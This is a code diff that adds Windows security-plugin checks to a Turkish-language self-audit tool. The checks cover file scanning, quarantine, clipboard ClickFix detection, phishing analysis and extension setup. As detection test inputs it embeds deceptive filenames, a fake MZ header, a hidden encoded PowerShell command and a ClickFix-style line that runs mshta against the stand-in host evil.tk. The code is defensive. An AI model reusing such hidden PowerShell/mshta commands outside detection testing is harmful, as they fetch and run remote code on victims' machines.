@@ -704,6 +704,153 @@ def _check_serve() -> list[dict]:
     return out
 
 
+def _check_win(root: Path) -> list[dict]:
+    """Windows Güvenlik Eklentisi (dosya tarama, LOLBin, pano/ClickFix, karantina, ENCM, CLI)."""
+    import tempfile
+
+    out = []
+    try:
+        from app.services.file_scanner import quarantine_file, scan_file_security
+
+        with tempfile.TemporaryDirectory() as td:
+            td_p = Path(td)
+            f1 = td_p / "fatura.pdf.exe"
+            f1.write_bytes(b"dummy")
+            r1 = scan_file_security(f1)
+            f2 = td_p / "rapor\u202efdp.exe"
+            f2.write_bytes(b"dummy")
+            r2 = scan_file_security(f2)
+            ok1 = r1["risk_score"] >= 25 and r2["risk_score"] >= 35
+            out.append(_bulgu("WIN-01", "WIN", "Çift uzantı + RLO dosya adı tespiti",
+                              "PASS" if ok1 else "FAIL",
+                              f"dbl={r1['risk_score']} rlo={r2['risk_score']}",
+                              "v1.3.0", "file_scanner çift uzantı ve RLO yakalamalı."))
+
+            f_mz = td_p / "sahte_belge.pdf"
+            f_mz.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00")
+            r_mz = scan_file_security(f_mz)
+            out.append(_bulgu("WIN-02", "WIN", "PE MZ sihirli bayt sahteciliği",
+                              "PASS" if r_mz["risk_score"] >= 40 else "FAIL",
+                              f"skor={r_mz['risk_score']}",
+                              "v1.3.0", "PDF/belge içine gizlenmiş MZ başlığı yakalanmalı."))
+
+            f_ps = td_p / "guncelle.ps1"
+            f_ps.write_text("powershell -w hidden -enc JAB4AD0AMQA=", encoding="utf-8")
+            r_ps = scan_file_security(f_ps)
+            out.append(_bulgu("WIN-03", "WIN", "LOLBin / gizli script tespiti",
+                              "PASS" if r_ps["risk_score"] >= 50 else "FAIL",
+                              f"skor={r_ps['risk_score']}",
+                              "v1.3.0", "Gizli PowerShell / MSHTA kalıpları yakalanmalı."))
+
+            qrec = quarantine_file(f_ps, quarantine_dir=td_p / "q", report=r_ps)
+            qpath = Path(qrec["quarantine_path"])
+            ok_q = qpath.exists() and qpath.suffix == ".quarantined" and not f_ps.exists() and (td_p / "q" / "file_quarantine.jsonl").exists()
+            out.append(_bulgu("WIN-05", "WIN", "Güvenli dosya karantinası (.quarantined)",
+                              "PASS" if ok_q else "FAIL",
+                              qpath.name if ok_q else "karantina başarısız",
+                              "v1.3.0", "Karantina uzantıyı etkisizleştirmeli ve loglamalı."))
+    except Exception as e:
+        out.append(_bulgu("WIN-01", "WIN", "Dosya tarama denetimi", "FAIL", str(e), "v1.3.0", "file_scanner izole çalışmalı."))
+
+    try:
+        from app.watchers.clipboard_guard import analyze_clipboard_text
+
+        bad_clip = analyze_clipboard_text("powershell -w hidden -enc JAB4 && mshta http://evil.tk/a")
+        good_clip = analyze_clipboard_text("Merhaba, toplantı saat 14:00'te.")
+        ok_cb = bad_clip["clickfix_detected"] and bad_clip["risk_score"] >= 40 and good_clip["risk_level"] == "LOW"
+        out.append(_bulgu("WIN-04", "WIN", "Pano ClickFix + FP koruması",
+                          "PASS" if ok_cb else "FAIL",
+                          f"bad={bad_clip['risk_score']} good={good_clip['risk_score']}",
+                          "v1.3.0", "ClickFix yakalanmalı, normal metin LOW kalmalı."))
+    except Exception as e:
+        out.append(_bulgu("WIN-04", "WIN", "Pano ClickFix denetimi", "FAIL", str(e), "v1.3.0", "clipboard_guard çalışmalı."))
+
+    try:
+        from app import secret_vault
+
+        ok_encm = secret_vault.is_protected("ENCM(dGVzdA==)") and secret_vault.is_protected("ENC(dGVzdA==)")
+        out.append(_bulgu("WIN-06", "WIN", "Makine düzeyi DPAPI formatı (ENCM)",
+                          "PASS" if ok_encm else "FAIL",
+                          "ENCM/ENC tanındı" if ok_encm else "ENCM tanınmadı",
+                          "v1.3.0", "Servis şifreleri ENCM(...) formatını desteklemeli."))
+    except Exception as e:
+        out.append(_bulgu("WIN-06", "WIN", "Makine DPAPI kontrolü", "FAIL", str(e), "v1.3.0", "secret_vault çalışmalı."))
+
+    try:
+        from app.cli import build_parser
+
+        p = build_parser()
+        subs = set()
+        for act in p._actions:
+            if hasattr(act, "choices") and isinstance(act.choices, dict):
+                subs.update(act.choices.keys())
+        need = {"scan-path", "quarantine-file", "watch", "clipboard", "service", "agent", "plugin", "native-host", "browser"}
+        ok_cli = need <= subs
+        out.append(_bulgu("WIN-07", "WIN", "Windows güvenlik eklentisi CLI komutları",
+                          "PASS" if ok_cli else "FAIL",
+                          f"komutlar={len(need & subs)}/{len(need)}",
+                          "v1.4.0", "scan-path/watch/clipboard/service/agent/plugin/native-host/browser kayıtlı olmalı."))
+    except Exception as e:
+        out.append(_bulgu("WIN-07", "WIN", "Windows eklenti CLI kontrolü", "FAIL", str(e), "v1.3.0", "Parser kontrolü."))
+
+    try:
+        import io
+        from app.native_host import handle_native_request, read_native_message, write_native_message
+
+        buf = io.BytesIO()
+        write_native_message(buf, {"action": "ping"})
+        buf.seek(0)
+        decoded = read_native_message(buf)
+        pong = handle_native_request(decoded or {})
+        phish = handle_native_request({
+            "action": "analyze_email",
+            "provider": "gmail",
+            "subject": "Hesabiniz kapanacak!",
+            "sender": "Destek <destek@gmail.com>",
+            "body": "Hemen tikla http://evil.tk/verify sifrenizi gonderin",
+        })
+        ok_nm = bool(pong.get("ok") and phish.get("ok") and phish.get("risk_score", 0) >= 50)
+        out.append(_bulgu("WIN-09", "WIN", "Tarayıcı Native Messaging analiz köprüsü",
+                          "PASS" if ok_nm else "FAIL",
+                          f"ping={pong.get('ok')} phish_score={phish.get('risk_score')}",
+                          "v1.4.0", "native_host framing ve webmail analizi çalışmalı."))
+    except Exception as e:
+        out.append(_bulgu("WIN-09", "WIN", "Tarayıcı Native Messaging köprüsü", "FAIL", str(e), "v1.4.0", "native_host çalışmalı."))
+
+    if EXE_MODU:
+        out.append(_skip_exe("WIN-08", "WIN", "Windows eklenti kurulum/kaldırma betikleri",
+                             "v1.3.0", "install_windows_plugin.ps1 + uninstall_windows_plugin.ps1 olmalı."))
+        out.append(_skip_exe("WIN-10", "WIN", "Tarayıcı MV3 eklentisi + deterministik ID",
+                             "v1.4.0", "extension/manifest.json ve fallback_analyzer.js bulunmalı."))
+    else:
+        inst = root / "backend" / "scripts" / "install_windows_plugin.ps1"
+        uninst = root / "backend" / "scripts" / "uninstall_windows_plugin.ps1"
+        out.append(_bulgu("WIN-08", "WIN", "Windows eklenti kurulum/kaldırma betikleri",
+                          "PASS" if inst.exists() and uninst.exists() else "FAIL",
+                          f"install={inst.exists()} uninstall={uninst.exists()}",
+                          "v1.3.0", "Yönetici kurulum/kaldırma betikleri bulunmalı."))
+        try:
+            import json as _json
+            from app.native_host import DEFAULT_EXTENSION_ID, derive_chrome_extension_id
+
+            mf_path = root / "extension" / "manifest.json"
+            fb_path = root / "extension" / "fallback_analyzer.js"
+            mf = _json.loads(mf_path.read_text(encoding="utf-8"))
+            eid = derive_chrome_extension_id(mf["key"])
+            ok_ext = (
+                eid == DEFAULT_EXTENSION_ID
+                and fb_path.exists()
+                and any("mail.google.com" in m for cs in mf.get("content_scripts", []) for m in cs.get("matches", []))
+            )
+            out.append(_bulgu("WIN-10", "WIN", "Tarayıcı MV3 eklentisi + deterministik ID",
+                              "PASS" if ok_ext else "FAIL",
+                              f"id={eid}",
+                              "v1.4.0", "extension/manifest.json anahtarı DEFAULT_EXTENSION_ID ile eşleşmeli."))
+        except Exception as e:
+            out.append(_bulgu("WIN-10", "WIN", "Tarayıcı MV3 eklentisi", "FAIL", str(e), "v1.4.0", "extension/ dosyaları geçerli olmalı."))
+    return out
+
+
 def run_kontrol(kategoriler: list[str] | None = None) -> dict:
     """Tüm denetimi koştur, sürüm sırasına göre optimize edilmiş rapor döndür."""
     root = Path(__file__).resolve().parents[2]
@@ -715,6 +862,7 @@ def run_kontrol(kategoriler: list[str] | None = None) -> dict:
         "IMAP": _check_imap_secret_guard,
         "OPS": lambda: _check_ops(root),
         "SERVE": _check_serve,
+        "WIN": lambda: _check_win(root),
     }
     if kategoriler:
         gruplar = {k: v for k, v in gruplar.items() if k in [x.upper() for x in kategoriler]}
